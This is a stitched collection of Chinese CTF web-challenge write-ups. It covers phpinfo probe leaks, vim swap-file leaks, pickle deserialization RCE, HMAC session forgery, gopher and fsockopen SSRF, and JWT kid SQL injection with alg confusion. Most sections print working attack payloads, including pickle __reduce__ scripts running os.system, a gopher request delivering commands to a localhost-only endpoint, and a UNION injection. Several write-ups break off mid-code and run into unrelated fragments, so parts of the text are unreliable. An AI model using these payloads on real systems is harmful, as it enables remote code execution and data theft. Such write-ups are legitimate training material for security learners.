    ctfshow — 探针泄露：一个 tz.php 把整台机器摊在页面上

    题目类型：信息收集 — 服务器探针（phpinfo）泄露环境信息

    Flag：ctfshow{b331ef56-d57c-4486-a229-0fa42200b6bf}

    题目概述

    进去是个普通页面，看不出东西。这题考的不是漏洞，是“服务器上不该存在的文件”。

    服务器探针是运维用来排查环境的小工具（PHP 版本、扩展、路径、环境变量全列出来）。忘了删，就等于把机器的体检报告挂在公网上。

    解题过程

    Step 1：先猜探针文件名

    探针文件名没有标准，但圈内有几个“约定俗成”的：

    tz.php        ← 这题用的（雅黑探针系列）
y.php
i.php
l.php
p.php
x.php
info.php
phpinfo.php
test.php
1.php

    为什么是这几个：探针类工具（雅黑探针、iProber 等）默认文件名就是这些短名，很多人下载后直接丢到根目录不改名。

    扫目录时把 php 后缀配上这几个单词；实在扫不出来，也可以手工挨个试——都是 GET，成本很低。

    Step 2：探针页面 → 点 phpinfo

    访问 tz.php，会看到一个功能页，上面有服务器信息汇总，还有几个链接，其中一个就是 phpinfo()。

    点进去之后，页面变成一大坨信息：

    PHP Version         7.3.11
System              Linux ...
Server API          FPM/FastCGI
Loaded Configuration File
Environment          ← 重点
PHP Variables        ← 重点

    phpinfo() 会把当前进程的环境变量整段打印出来。

    而很多部署方式（Docker、docker-compose、K8s）会把 flag 作为环境变量注入容器——因为写进文件容易被镜像带上，放环境变量“看起来安全”。

    Step 3：在页面里找 flag

    phpinfo 页面非常长，靠肉眼翻基本翻不到。用浏览器搜索：

    Ctrl + F  →  输入 flag  →  回车

    命中之后会高亮，直接看右边那一列的值：

    FLAG    ctfshow{b331ef56-d57c-4486-a229-0fa42200b6bf}

    如果是命令行，就更省事：

    curl.exe -s -k "https://目标/tz.php" | Select-String -Pattern "flag"

    或者直接抓 phpinfo 输出并过滤：

    curl.exe -s -k "https://目标/phpinfo.php" | Select-String -Pattern "FLAG"
    关键点 说明
    探针 运维排查用的小工具，暴露版本/路径/扩展/环境变量
    常见文件名 tz.php、y.php、i.php、info.php、phpinfo.php、1.php
    phpinfo 的价值 Environment 区块包含进程环境变量
    为什么 flag 在环境变量 容器部署时常把敏感值放 env，避免写进镜像文件
    怎么快速定位 浏览器 Ctrl+F 搜 flag，或 curl \| Select-String
    这类文件为什么危险 除了 flag，还可能泄露数据库账号、内部路径、AK/SK
    命令行一把梭 
    # 先找探针
foreach ($p in "tz.php","y.php","i.php","info.php","phpinfo.php","1.php") {
  $code = curl.exe -s -o NUL -w "%{http_code}" -k "https://目标/$p"
  if ($code -eq "200") { Write-Output "$p 存在" }
}

# 再搜 flag
curl.exe -s -k "https://目标/tz.php" | Select-String "flag"
    这题踩的坑

    ① 只看首页

    探针不在首页链接里，得自己敲路径。这类题的关键动作是“猜文件名”，不是“看页面”。

    ② 进了探针页就停住

    探针页只是汇总，真正有 env 的是它里面的 phpinfo() 子页面，还得再点一次。

    ③ 肉眼翻 phpinfo

    页面几千行，翻不到很正常。Ctrl+F 搜 flag 是最快的，其次是 Select-String。

    ④ 只搜“环境变量”一个区块

    有些题把 flag 放在 PHP Variables 或 $_SERVER 里。搜关键字比找区块快。

    ctfshow — vim 临时文件泄露：服务器崩了，源码留在磁盘上

    题目类型：信息收集 — vim 交换文件（.swp）泄露源码

    Flag：ctfshow{ef6a863e-b17d-42be-b23d-56e6065f6581}

    题目概述

    题目就一句话：

    发现网页有个错别字？赶紧在生产环境 vim 改下，不好，死机了

    这句话不是在讲段子，是在交代“源码曾经被 vim 打开过，而且没正常退出”。

    靶场默认开 https，浏览器里删掉 s 换 http 有时能少踩证书的坑（这题两种都行）。

    解题过程

    Step 1：读懂提示

    vim 在编辑文件时不是“直接改原文件”，它会生成一个交换文件（swap file）放在同目录下。

    作用有两个：

    ① 崩溃/断电后能恢复没保存的改动
② 防止两个人同时编辑同一个文件

    如果 vim 被异常终止（进程被杀、机器死机、SSH 断线），这个交换文件不会被删除，就留在 Web 目录里。

    而 Web 目录里的东西——能通过 HTTP 直接下载。

    这就是“vim 临时文件泄露”。

    Step 2：交换文件叫什么名字

    vim 的命名规则是：在原文件名前面加一个点，后面加 .swp。

    原文件      index.php
交换文件    .index.php.swp

    如果同一个文件已经被打开过多次（上一次的 swp 没清），后缀会往后排：

    .index.php.swp    第一次
.index.php.swo    第二次
.index.php.swn    第三次

    另外还有两种常见的“vim 残留”：

    index.php~          备份文件（backup）
.index.php.un~      undo 文件

    扫目录时把这几个后缀一起加上，命中率很高。

    Step 3：把文件下下来

    curl.exe -s -k "https://目标/.index.php.swp" -o index.php.swp

    用 -k 是因为靶场是自签证书。

    下下来先确认是不是真的 swp：

    Format-Hex -Path index.php.swp -Count 64

    开头应该是 b0VIM 这四个字节（0x62 0x30 0x56 0x49 0x4D）——这是 vim 交换文件的魔数。

    Step 4：从 swp 里把源码还原出来

    swp 是二进制文件（里面是分块保存的文本 + 元信息），不能直接 cat 当源码读，但文本块是明文存放的，所以有两种办法：

    ① 用 vim 自己恢复（最干净）

    vim -r index.php.swp

    vim 会提示恢复，确认后 :w index_recovered.php 存出来。

    ② 直接抽可打印字符串（最快）

    strings index.php.swp | Select-String "flag|<?php|function"

    Windows 上没有 strings 的话，用 Python 也行：

    import re
data = open("index.php.swp", "rb").read()
print("".join(chr(b) if 32 <= b < 127 else "\n" for b in data))

    两种都能看到源码——这题的 flag 就在里面：

    ctfshow{ef6a863e-b17d-42be-b23d-56e6065f6581}
    关键点 说明
    触发条件 vim 异常退出（死机/断连/被杀），swp 留在 Web 目录
    命名规则 .原文件名.swp，如 .index.php.swp
    多次打开 后缀顺延 .swo / .swn
    其他残留 index.php~（备份）、.index.php.un~（undo）
    文件特征 开头 b0VIM（魔数），二进制但文本块明文
    还原方式 vim -r xxx.swp 或 strings 抽取
    题目提示的作用 “死机了”就是在告诉你“没正常退出 → swp 还在”
    目录扫描时该加的后缀 
    .swp  .swo  .swn  .swx  .un~  ~  .bak  .old  .orig

    dirsearch 里对应 -e php,swp,swo,swn,bak,old,orig,txt。

    这题踩的坑

    ① 文件名写成 index..php.swp

    多了一个点。规则是“点 + 原文件名 + .swp”，原文件名本身就带 .php，所以是 .index.php.swp。

    ② 把 swp 当普通文本打开

    它是二进制块文件，直接打开会看到一堆乱码。用 vim -r 恢复，或者用 strings 抽可打印字符。

    ③ 只试了 .swp 没试 .swo

    如果那个文件被 vim 打开过两次，第一次的 swp 可能已经变成 swo。后缀要一起试。

    ④ 忽略了 index.php~

    备份文件是纯文本，比 swp 还好读。看到 ~ 结尾的文件优先下它。

    [HZNUCTF 2023 preliminary] picklewp — 把命令结果写到文件，再换个名字读回来

    题目类型：Python 反序列化（pickle RCE）+ 关键词过滤绕过

    Flag：NSSCTF{4344aed6-c797-4af0-9a97-f8ab871aad19}

    题目概述

    进靶场直接给源码。先把缩进换行整理一遍再读——粘出来格式全乱了，Shift+Alt+F 走一下。

    源码一共二十行，三个路由。

    解题过程

    Step 1：读源码，两个点连起来看

    @app.route('/')
def index():
    with open('app.py', 'r') as f:
        return f.read()

@app.route('/calc', methods=['GET'])
def getflag():
    payload = request.args.get("payload")
    pickle.loads(base64.b64decode(payload).replace(b'os', b''))
    return "ganbadie!"

@app.route('/readFile', methods=['GET'])
def readFile():
    filename = request.args.get('filename').replace("flag", "?????")
    with open(filename, 'r') as f:
        return f.read()

    三个路由各司其职：

    /          直接把源码吐出来（等于免费给源码）
/calc      base64 解码 → pickle.loads → 反序列化执行
/readFile  读任意文件，但文件名里的 "flag" 会被替换成 "?????"

    所以这题的结构是：

    /calc 负责执行命令（把结果写到文件里）
/readFile 负责把文件读出来（但文件名不能带 flag）

    两个点必须连起来用——一个没有回显，另一个不能读带 flag 名字的文件。

    Step 2：/calc 的过滤怎么绕

    pickle.loads(base64.b64decode(payload).replace(b'os', b''))

    注意执行顺序：先 base64 解码，再对解码出来的字节做 os 替换。

    所以只要 payload 里出现连续的 os，就会被删掉——pickle.loads 直接炸。

    绕过方式：字符串拼接。

    '__import__("o" + "s").system("id")'

    在 pickle 的字节流里，o 和 s 是两个独立的字符，不会形成连续的 os；到运行时它们才拼成 os。

    这是“过滤字符但是执行时拼接”的通用思路。

    Step 3：构造 pickle payload

    class evil:
    def __reduce__(self):
        import os
        return (eval, ("__import__('o'+'s').system('env > x.txt')",))

new = base64.b64encode(pickle.dumps(evil(), protocol=4)).decode()
print(urllib.parse.quote(new))

    三个要点：

    ① __reduce__：反序列化时返回 (可调用对象, 参数) → 服务器执行 eval(...)
② 'o'+'s' 拼接：避开 replace(b'os', b'')
③ urllib.parse.quote：base64 里的 + 必须做 URL 编码

    Step 4：为什么 + 必须编码（这题卡最久的地方）

    base64 的字符集里包含 +，而 + 放在 URL 的 query 里会被解码成空格。

    于是你发出去的是：

    /calc?payload=gAN9cQAo...ab+cd...

    服务器收到的 payload 已经变成：

    gAN9cQAo...ab cd...

    中间多了一个空格，base64 解码直接失败——而 /calc 成功时只返回 ganbadie!，失败时也没有明显报错，看起来就像“没反应”。

    所以脚本最后一定要 quote()：

    +  →  %2B

    这也是为什么用 curl -G --data-urlencode 更省事——它替你编码。

    Step 5：第一次读到的“flag”是假的

    先 cat /f*，写进 x.txt，再用 /readFile?filename=./x.txt 读回来：

    flagnothere

    是个干扰文件。

    接着 ls /，根目录下只有一个 flag.sh——读出来也不是真的。

    那就换方向：看环境变量。

    "__import__('o'+'s').system('env > x.txt')"

    /readFile?filename=./x.txt 读回来，flag 在环境变量里：

    NSSCTF{4344aed6-c797-4af0-9a97-f8ab871aad19}
    关键点 说明
    /calc pickle.loads(b64decode(payload)) → 反序列化即执行
    过滤 .replace(b'os', b'') 作用在解码后的字节上
    绕过 'o' + 's' 拼接，字节流里不出现连续 os
    /readFile 文件名里的 flag 会被替换成 ????? → 必须换个名字写
    读写配合 /calc 写文件、/readFile 读回来（无回显题的常规套路）
    + 的坑 base64 的 + 在 query 里会被当空格，必须 quote()
    假 flag flagnothere、/flag.sh 都是干扰，真正的在环境变量
    完整 payload 
    import base64
import pickle
import urllib.parse

class evil:
    def __reduce__(self):
        return (eval, ("__import__('o'+'s').system('env > x.txt')",))

new = base64.b64encode(pickle.dumps(evil(), protocol=4)).decode()
print(urllib.parse.quote(new))

    curl.exe -s -G --data-urlencode "payload=gAN9cQAo...（上面输出的结果）" "http://目标/calc"
curl.exe -s -G --data-urlencode "filename=./x.txt" "http://目标/readFile"
    这题踩的坑

    ① __import__['o'+'s'] 写成了下标

    那是函数调用不是取下标，必须写 __import__('o'+'s')。写成方括号，eval 直接抛 TypeError，而 /calc 失败时页面没反馈，很难察觉。

    ② base64 的 + 没编码

    query 里的 + → 空格 → base64 解码失败。表现是“页面没反应”，不是报错。这是这题最容易卡住的地方。

    ③ 想直接 /readFile?filename=/flag

    源码里 filename.replace("flag", "?????")——连路径里的 flag 都会被替换。所以必须先把内容写到另一个名字的文件里（x.txt），再读那个文件。

    ④ 只在根目录找 flag

    cat /f* 出来 flagnothere、ls / 只有一个 flag.sh。真 flag 在环境变量里（env）。

    [watevrCTF-2019] Pickle Store — 改完钱还得把签名一起算对

    题目类型：Python 反序列化 — pickle session + HMAC 签名伪造

    Flag：CTF2{eea2f800-cc38-47ee-bc10-05205f709eb8}

    题目概述

    一个卖腌黄瓜的商店。目标很明确：买下那个 $1000 的 Flag Pickle。

    但初始资金不够。页面顶上显示 Your funds: $998999（这是改成功之后的样子，初始只有 500）。

    于是问题变成：怎么让服务器相信我有钱。

    解题过程

    Step 1：先随便买几个，看看有没有别的反馈

    点了标准腌黄瓜（$10）和 Smörgåsgurka（$100），除了 history 里多两条记录，没有别的反应。

    真正的东西在 cookie 里。

    Step 2：session cookie 是 base64 过的 pickle

    抓包看到一个 session cookie，长得像 base64：

    gAN9cQAoWAAAA...（很长）

    base64 解一次，得到的是二进制——而且开头是 \x80\x04\x95，这是 pickle 的协议头。

    Python 的 session 直接把字典 pickle 完再 base64 塞进 cookie，等于把内部对象结构交给客户端保存。

    Step 3：解开看结构

    import pickle, base64

data = pickle.loads(base64.b64decode(session_cookie))
print(data)

    得到一个字典：

    {
  'money': 500,
  'history': ['Yummy smörgåsgurka', 'Yummy standard pickle'],
  'anti_tamper_hmac': '29ea7e88282f92f4ffc2976f14905697'
}

    三个键：钱、购买记录、还有一个防篡改的 HMAC。

    Step 4：直接改 money —— 失败

    第一反应是 data['money'] = 1000000，重新 pickle + base64，替换 cookie。

    结果页面上钱还是 500。

    原因就是第三个键：anti_tamper_hmac。

    服务端每次收到请求都会重新算一遍 HMAC，和你 cookie 里带来的那个比。对不上，就用默认的 money=500 重建 session。

    所以光改值不行，签名也得跟着对。

    Step 5：顺手试一下 pickle 本身能不能执行代码

    pickle 反序列化的经典利用是 __reduce__：

    class evil:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').system('sleep 5') or 0",))

payload = base64.b64encode(pickle.dumps(evil(), protocol=4)).decode()

    把 session 换成这个 payload，页面确实延迟了 5 秒——说明服务器在反序列化的那一刻就执行了我们的代码。

    接着试了把 ls 的结果写到 static/ 目录下，再从浏览器去访问，打不开。这条路放弃。

    Step 6：去 GitHub 找源码

    作者把源码开源在 GitHub 上。翻到处理 session 的那段：

    h = hmac.new(key)
h.update(str(cookies).encode())
cookies["anti_tamper_hmac"] = h.digest().hex()
resp.set_cookie("session", base64.b64encode(pickle.dumps(cookies)))
return resp

    然后把 key 也找到了：

    key = b"58c93becce9a13c96778ded0edd8096d"

    这里要注意两个细节：

    ① HMAC 用的是 md5（源码里 hmac.new(key, digestmod=hashlib.md5)）
② 参与计算的是 str(cookies)，而且是在**加入 anti_tamper_hmac 之前**的字典

    也就是说：服务端把你 cookie 里的 money 和 history 拼成 Python 字典的字符串形式，再算 HMAC。

    知道 key，我们就能自己算出一个合法的签名。

    Step 7：本地构造 + 签名 + 替换

    import base64
import pickle
import hmac

    [GHCTF 2025] Goph3rrr — 用 gopher 让服务器给自己发一条 POST

    题目类型：Python 代码审计 — curl SSRF + gopher 协议构造任意 TCP 报文

    Flag：NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}

    题目概述

    进靶场没有任何有用信息，页面源码也是空的。那就扫目录。

    扫出来 app.py，拿源码审计。

    解题过程

    Step 1：先排除干扰路由

    源码里一堆路由，其中这三个是摆设：

    /Login
/Register
/Upload

    旁边还标着 junkcode——作者明说了是混淆视听用的，直接跳过，一个都别管。

    真正有用的只有两个：/Gopher 和 /Manage。

    Step 2：/Manage 是 RCE 点

    @app.route('/Manage', methods=['POST'])
def cmd():
    if request.remote_addr != "127.0.0.1":
        return "Forbidden!!!"
    if request.method == "GET":
        return "Allowed!!!"
    if request.method == "POST":
        return os.popen(request.form.get("cmd")).read()

    三句话读完：

    来源必须是 127.0.0.1      → 外部直连一定被拒
方法必须是 POST           → 路由上就写死了 methods=['POST']
cmd 从 form 里取          → 直接进 os.popen

    注意中间那个 if request.method == "GET" 分支是无用代码——路由只注册了 POST，GET 根本进不来（会 405）。不用管它。

    所以目标是：让服务器自己向 /Manage 发一条 POST，带上 cmd。

    Step 3：/Gopher 给了我们“发请求”的能力

    @app.route('/Gopher')
def visit():
    url = request.args.get('url')
    if url is None:
        return "No url provided :)"
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == "file" or realIpAddress in BlackList:
        return "No (≧∇≦)"
    result = subprocess.run(["curl", "-L", urlunparse(url)], capture_output=True, text=True)
    return result.stdout

    做的事：

    ① 取 url 参数
② 解析出 hostname，解析成 IP，判断是否在黑名单
③ 拦截 file:// 协议
④ 没过就交给 curl -L <url> 去请求，把输出返回

    这里的关键是 curl。curl 支持的不只是 http——它还支持 gopher://。

    gopher://host:port/_<data> 的含义是：连到这个 host 的 port，把 _ 后面的内容原样作为字节发过去，然后把响应读回来。

    这就是“手写任意 TCP 报文”的口子。

    Step 4：为什么要用 0.0.0.0 而不是 127.0.0.1

    realIpAddress in BlackList 拦的是解析出来的 IP。127.0.0.1 这种回环地址几乎一定在黑名单里。

    而 0.0.0.0 在 Linux 上是“本机所有地址”，连它等于连本机，但它不在黑名单里。

    所以 host 用 0.0.0.0：

    gopher://0.0.0.0:8000/_...

    连上去之后，REMOTE_ADDR 就是 127.0.0.1，/Manage 的来源校验就过了。

    Step 5：报文怎么写

    要发给 /Manage 一条 POST，报文必须是完整 HTTP：

    POST /Manage HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

cmd=ls /

    几个必须对的地方：

    ① 行尾必须 \r\n（CRLF），不是 \n
② 头部和 body 之间必须有一个空行（\r\n\r\n）
③ Content-Length 必须等于 body 的字节数
   "cmd=ls /" 正好 8 个字节
④ 先 GET 的话进不去——路由只收 POST

    gopher 里要再做一次 URL 编码，\r\n 变成 %0D%0A：

    gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/

    Step 6：用脚本拼，别手写

    这条串里 %0D%0A 出现六次，手写必错。用脚本生成：

    import urllib.parse

body = "cmd=ls /"
req = (
    "POST /Manage HTTP/1.1\r\n"
    "Host: 127.0.0.1:8000\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: %d\r\n"
    "\r\n"
    "%s"
) % (len(body), body)

print("gopher://0.0.0.0:8000/_" + urllib.parse.quote(req))

    quote() 会把 \r\n 编码成 %0D%0A、空格编码成 %20，你只管把报文写对。

    Step 7：打出去

    curl 这边用 -G --data-urlencode，让命令帮忙做一次编码：

    curl.exe -s -G --data-urlencode "gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/" "http://node6.anna.nssnode.cn:24267/Gopher"

    三个参数各管一件事：

    -s                静默模式：不打印进度条和错误信息
-G                把后面 --data 的内容拼到 URL 的 query 上，而不是发 body
--data-urlencode  对内容做 URL 编码后再拼（等价于 ?url=<编码后的值>）

    等价于：

    GET /Gopher?url=gopher%3A%2F%2F0.0.0.0%3A8000%2F_...

    Step 8：先 ls，再去环境变量里找

    第一次 cmd=ls /，根目录里没有 flag。

    那就看环境变量——把 body 换成 cmd=env：

    body = "cmd=env"

    flag 直接躺在环境变量里：

    NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}
    关键点 说明
    /Manage 来源必须是 127.0.0.1、方法必须是 POST、cmd 直接进 os.popen
    /Gopher 服务器用 curl 请求你给的 url → curl 支持 gopher → 可发任意 TCP 报文
    黑名单 按 gethostbyname(hostname) 判，127.0.0.1 大概率在里面
    0.0.0.0 连它等于连本机，但不在黑名单里 → 绕过同时拿到 127.0.0.1 来源

    [HNCTF 2022 WEEK2] ez_ssrf — fsockopen 自己给自己发一条 HTTP

    题目类型：PHP 代码审计 — fsockopen 造成的 SSRF（本机回环绕过来源校验）

    Flag：nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}

    题目概述

    提示让进 index.php，进去就是源码。highlight_file(__FILE__)，一点遮挡都没有。

    同时扫目录扫到 flag.php，但直接访问它，返回的是 localhost plz。

    解题过程

    Step 1：先看源码

    <?php
highlight_file(__FILE__);
error_reporting(0);

$data = base64_decode($_GET['data']);
$host = $_GET['host'];
$port = $_GET['port'];

$fp = fsockopen($host, intval($port), $error, $errstr, 30);
if (!$fp) {
    die();
} else {
    fwrite($fp, $data);
    while (!feof($data)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}

    三个参数全部来自 GET，而且都直接进函数：

    host  →  fsockopen 的第一个参数
port  →  第二个参数（有 intval）
data  →  base64 解码后直接写进 socket

    fsockopen 是“建立一条 TCP 连接”，fwrite 是“往这条连接里发原始字节”。

    这等于给了我们一个可以手写任意 TCP 报文的口子。

    Step 2：为什么改 Host 头没用

    flag.php 检查的不是请求头里的 Host，而是连接的来源地址（$_SERVER['REMOTE_ADDR']）。

    所以你在浏览器或 Burp 里把 Host: localhost 改掉，来源地址还是你自己的 IP，一样被拒。

    这就是这题的题眼：改“名字”没用，得改“谁在连”。

    要让来源变成 127.0.0.1，只有一条路——让服务器自己去连自己。

    Step 3：构造发出去的报文

    fsockopen('127.0.0.1', 80) 连上的是这台机器自己的 80 端口，也就是 Web 服务器本身。来源地址自然就是 127.0.0.1。

    接下来 fwrite($fp, $data) 会把 data 原样写进这个 socket。既然对面是 HTTP 服务器，那我们就手写一条 HTTP 请求：**

    GET /flag.php HTTP/1.1
Host: localhost
Connection: close

    注意三件事：

    ① 每一行结尾必须是 \r\n（CRLF），不是 \n
② 最后要有一个空行（\r\n\r\n），表示请求头结束
③ Connection: close 让对端在响应完就关闭连接，
   这样后面 fgets 才能读到 EOF，不会一直挂着

    编码成 base64：

    import base64

raw = "GET /flag.php HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
print(base64.b64encode(raw.encode()).decode())

    得到：

    R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

    Step 4：为什么建议用脚本生成 base64

    \r\n 这两个字符最容易在“复制粘贴”里丢掉。

    很多在线 base64 工具、聊天框、编辑器，会把 \r\n 悄悄规范成 \n，你看起来“一模一样”，但发出去的报文行尾是 LF，服务端解析请求行的时候就错了。

    所以这题的编码一定在脚本里做：让 \r\n 从代码里生成，不让它经过剪贴板。

    Step 5：打完整 payload

    index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

    服务器做的事：

    fsockopen("127.0.0.1", 80)      建立本机连接，来源 = 127.0.0.1
fwrite 我们的 HTTP 报文         请求 /flag.php
while 循环 fgets 读回响应       flag 就在响应体里
echo                           输出到页面

    拿到：

    nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}

    顺带解释：为什么这题“回应有点慢”

    源码里这句是写错了的：

    while (!feof($data)) {      // $data 是字符串，不是文件句柄
    echo fgets($fp, 128);
}

    feof() 的参数应该是文件句柄（这里该是 $fp）。传字符串进去，它只会返回 false（配合 error_reporting(0)，连警告都看不到）。

    于是 !feof($data) 恒为真——这个循环实际上是个死循环。

    它能“结束”，靠的是：

    对端响应完 → Connection: close 关闭连接
→ fgets($fp) 读到 EOF 返回 false
→ echo false 什么也不输出，但循环还在转
→ 直到 PHP 脚本超时（或连接彻底断掉）才停

    flag 在第一轮就已经被 echo 出去了，所以你能看到结果；但请求会一直挂到超时，这就是“慢”的来源。**

    如果按正确写法 feof($fp)，读到 EOF 就该退出循环，响应会立刻返回。

    关键点 说明
    fsockopen 建立 TCP 连接，host/port 全可控 → SSRF
    来源校验 flag.php 判的是 REMOTE_ADDR，不是 Host 头
    绕过思路 让服务器连自己（127.0.0.1），来源就变成内网
    data base64 解码后原样 fwrite，等于手写 TCP 报文
    报文格式 行尾 \r\n，头部结束后要空行 \r\n\r\n
    Connection: close 让对端响应后关连接，fgets 才能读到 EOF
    feof($data) 源码笔误（应为 $fp），导致死循环 → 响应慢
    base64 陷阱 剪贴板/工具会把 \r\n 变 \n，必须在脚本里生成
    完整请求 
    GET /index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

data 解码后：
GET /flag.php HTTP/1.1\r\n
Host: localhost\r\n
Connection: close\r\n
\r\n
    这题踩的坑

    ① 改 Host 头

    Host: localhost 改与不改都没用——服务端看的不是这个头，是 TCP 连接的来源地址。

    ② payload 里手写 127.0.01

    少一位点。127.0.01 在很多系统里解析不到，或者被当成别的写法，连接直接失败。

    ③ 在线工具转 base64

    \r\n 被吃成 \n，报文行尾就错了。这题的编码必须在脚本里做。

    ④ 以为响应慢是网络问题

    是源码里 feof($data) 写错导致的死循环，跟网络无关。

    [De1CTF 2019] SSRF Me — 拼接没有分隔符，签名可以跨动作借

    题目类型：Python 代码审计 — 签名拼接边界移位 + SSRF

    Flag：CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}

    题目概述

    页面直接给出源码，但缩进和换行全乱了——粘进 VS Code 先 Shift+Alt+F 格式化一遍再读，否则没法审计。

    这题的坑不在 SSRF 本身（那个一眼就能看出来），在签名怎么过。

    解题过程

    Step 1：先看 sign 校验

    入口两个路由，/De1ta 才是能打的：

    @app.route('/De1ta', methods=['GET', 'POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if (waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())

    三个输入来自两处：

    cookies 里取 action 和 sign
query   里取 param

    校验在 Task.checkSign()：

    def checkSign(self):
    if (getSign(self.action, self.param) == self.sign):
        return True
    else:
        return False

def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()

    所以规则是：md5(secret_key + param + action) 必须等于你 cookie 里的 sign。

    secert_key = os.urandom(16)（源码里就是这么拼的）——每次启动重新随机，算不出来，只能想办法让服务器自己算。

    Step 2：Exec 里先看 action 包含什么

    def Exec(self):
    result = {}
    result['code'] = 500
    if (self.checkSign()):
        if "scan" in self.action:
            tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
            resp = scan(self.param)
            if (resp == "Connection Timeout"):
                result['data'] = resp
            else:
                print resp
                tmpfile.write(resp)
                tmpfile.close()
                result['code'] = 200
        if "read" in self.action:
            f = open("./%s/result.txt" % self.sandbox, 'r')
            result['code'] = 200
            result['data'] = f.read()
        if result['code'] == 500:
            result['data'] = "Action Error"
    else:
        result['code'] = 500
        result['msg'] = "Sign Error"
    return result

    注意两处用的是 in，不是 ==：

    if "scan" in self.action:
if "read" in self.action:

    这意味着 action 可以同时包含 scan 和 read——这也是后面能成的原因。

    两个分支各干一件事：

    scan  把 scan(param) 的结果写进 ./<sandbox>/result.txt
read  把 result.txt 读出来，放进 result['data'] 返回

    sandbox = md5(remote_addr)，也就是每个 IP 一个目录。

    所以光有 scan 你是看不到结果的（响应里只有 {"code":200}），光有 read 你读的是一个空文件。必须两个都在。

    Step 3：scan 就是 SSRF

    def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"

    param 被原样丢进 urllib.urlopen()——它能打开 URL，也能打开本地文件。

    这里有个容易看错的细节：[:50] 是前 50 个字符，不是前 50 行。要读 50 行得先 splitlines()。这题 flag 短，50 个字符够了，所以看不出差别。

    Step 4：WAF 拦了什么

    def waf(param):
    check = param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:

    只拦两个前缀：gopher 和 file。

    先把登录拿到的令牌拆开：

    kid 是「密钥编号」。key_002 这种命名说明服务端是按 kid 去一张密钥表里挑密钥，而不是全站共用一把。

    结论：kid 是直接字符串拼进 SQL 的，没有参数化。

    关键理解：要控制的是「返回值」，不是「条件」

    写法 WHERE 查询结果 能不能用
    key_002' OR 1=1 -- 恒真 表里真实存在的密钥 ❌ 密钥你不知道，签名照样做不出来
    x' union select 'abc' -- 查不到 x 你指定的 abc ✅ 密钥变成你能签的东西

    第一条是我第一反应写的 OR 1=1。它的问题在于只改变「选哪些行」，不改变「选出来的值」——服务端拿到的还是真密钥，你手里的签名对不上，403。

    UNION 才是把外部值塞进结果集的办法：

    kid = x' union select 'abc' -- 
      │                │       └─ 注释掉原本结尾那个单引号（-- 后面必须有空格）
      │                └──────── 你指定的密钥，记牢，下一步签名要用
      └───────────────────────── 表里不存在的 key，保证第一条 SELECT 返回 0 行

    fetchone() 只取第一行，所以前缀必须查不到，否则拿到的还是真密钥，注入白做。

    三个条件必须同时满足

    # 条件 写错会怎样
    1 kid 前缀在表里查不到 取到真密钥 → 403
    2 签名用 abc 当 HMAC 密钥重算 签名对不上 → 403
    3 payload 里 role 是 admin 验签过了但角色不对 → 403

    第二关：alg 混淆，用公钥签名

    后台「系统管理」里有个系统诊断工具，输入 127.0.0.1 点执行，返回：

    这时候 jwks.json 派上用场：

    两种签名，密钥关系是反的

    HS256（对称）   签名 = HMAC-SHA256(密钥, header.payload)
                验签 = 用同一把密钥再算一遍

RS256（非对称） 签名 = RSA-SHA256(私钥, header.payload)   ← 只有私钥能签
                验签 = RSA-Verify(公钥, 签名)            ← 谁都能验

    HS256 的密钥是共享的：谁能验，谁就能签。RS256 的公钥是公开的：只能验，不能签。

    漏洞就在「同一个变量，两种用法」

    alg = header["alg"]                       # ← 这个值是你写的
pub = open("service_public.pem", "rb").read()

if alg == "RS256":
    jwt.decode(token, pub, algorithms=["RS256"])      # pub 当公钥用，只能验
elif alg == "HS256":                                  # 「历史兼容」分支
    hmac.new(pub, signing_input, sha256) == signature  # pub 当共享密钥用，能签

    同一个 pub，上面是公钥，下面是共享密钥。只要我把 alg 写成 HS256，再用这份公开的 pub 自己算一个签名，服务端会用同一份 pub 再算一遍，结果必然相等。

    把 n/e 还原成 PEM

    jwks.json 里只有 n 和 e，要拼回 PEM（DER → base64 → 加头尾）：

from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

j = requests.get(BASE + "/jwks.json", timeout=20).json()["keys"][0]
n = int.from_bytes(base64.urlsafe_b64decode(j["n"] + "=="), "big")
e = int.from_bytes(base64.urlsafe_b64decode(j["e"] + "=="), "big")
